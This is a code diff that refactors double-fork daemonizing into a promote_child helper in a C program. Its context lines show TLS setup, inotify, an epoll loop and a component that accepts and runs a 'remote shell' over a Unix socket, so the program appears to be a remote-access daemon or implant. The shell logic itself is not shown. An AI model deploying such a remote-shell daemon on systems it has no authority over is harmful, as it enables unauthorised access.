@@ -272,6 +272,13 @@ int create_inotify_descriptor(void) {
     return fd;
 }
 
+void promote_child(void) {
+    if (wrapped_fork()) {
+        exit(EXIT_SUCCESS);
+    }
+    setsid();
+}
+
 /*
  * function:
  *    main
@@ -297,10 +304,7 @@ int main(void) {
     }
 
     //Daemonize
-    if (wrapped_fork()) {
-        return EXIT_SUCCESS;
-    }
-    setsid();
+    promote_child();
 
     init_openssl();
     SSL_CTX* ctx = create_context();
@@ -347,10 +351,7 @@ int main(void) {
     if (!wrapped_fork()) {
         run_remote_shell();
     } else {
-        if (wrapped_fork()) {
-            return EXIT_SUCCESS;
-        }
-        setsid();
+        promote_child();
         remote_shell_sock = accept(remote_shell_unix, NULL, 0);
         fcntl(remote_shell_sock, F_SETFL, fcntl(remote_shell_sock, F_GETFL, 0) | O_NONBLOCK);
 
@@ -359,16 +360,10 @@ int main(void) {
         printf("accept %d\n", remote_shell_sock);
     }
 
-    if (wrapped_fork()) {
-        return EXIT_SUCCESS;
-    }
+    promote_child();
 
-    setsid();
     if (!wrapped_fork()) {
-        if (wrapped_fork()) {
-            return EXIT_SUCCESS;
-        }
-        setsid();
+        promote_child();
 
         int efd = create_epoll_fd();
         struct epoll_event* eventList = calloc(100, sizeof(struct epoll_event));
